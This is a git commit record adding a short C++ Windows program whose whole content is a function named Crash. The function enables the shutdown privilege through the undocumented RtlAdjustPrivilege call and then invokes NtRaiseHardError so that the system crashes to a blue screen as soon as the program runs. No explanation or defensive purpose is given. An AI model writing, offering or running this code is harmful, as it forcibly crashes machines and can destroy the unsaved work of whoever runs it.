3747eb8ecd7ceffffe7fd216fd1541e3410bd850
Buxy <47367285+buxy-xyz@users.noreply.github.com>
2019-02-05 22:59:38 +0100

    Add files via upload

---
+++ main.cpp
@@ -0,0 +1,20 @@
+#include <iostream>
+#include <windows.h>
+#pragma comment(lib, "ntdll.lib")
+
+extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
+extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
+	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
+
+void Crash()
+{
+	BOOLEAN bl;
+	ULONG Response;
+	RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
+	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
+}
+
+int main()
+{
+	Crash();
+}
